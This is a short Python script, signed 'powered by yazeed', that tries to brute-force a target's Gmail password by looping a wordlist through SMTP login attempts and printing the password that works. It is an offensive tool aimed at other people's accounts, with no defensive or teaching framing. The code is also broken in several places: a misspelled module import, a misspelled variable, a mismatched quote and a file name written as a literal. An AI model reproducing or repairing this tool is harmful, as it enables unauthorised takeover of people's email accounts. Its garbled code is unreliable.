print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")
print("+                                                          +")
print("+               [!] powered by yazeed [!]                  +")
print("+                                                          +")
print("++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++")

import smplib

smtpserver = smtplib.SMTP("smtp.gmail.com",587)
smtpserve.ehlo()
smtpserver.starttls()

email = raw_input("Enter Email Targets: ")
passwfile = raw_input("Enter WordList File: ")
passwfile = open("passwfile,"r")
                 
for password in passwfile:
    try:
       smtpserver.login(email,password)
       print("[+] PASS FOND ===> %s ") % password
       break;
                 
    except smtplib.SMTPAuthenticationError:
       print("[!] PASS INCORRECT ===> %s ") % password
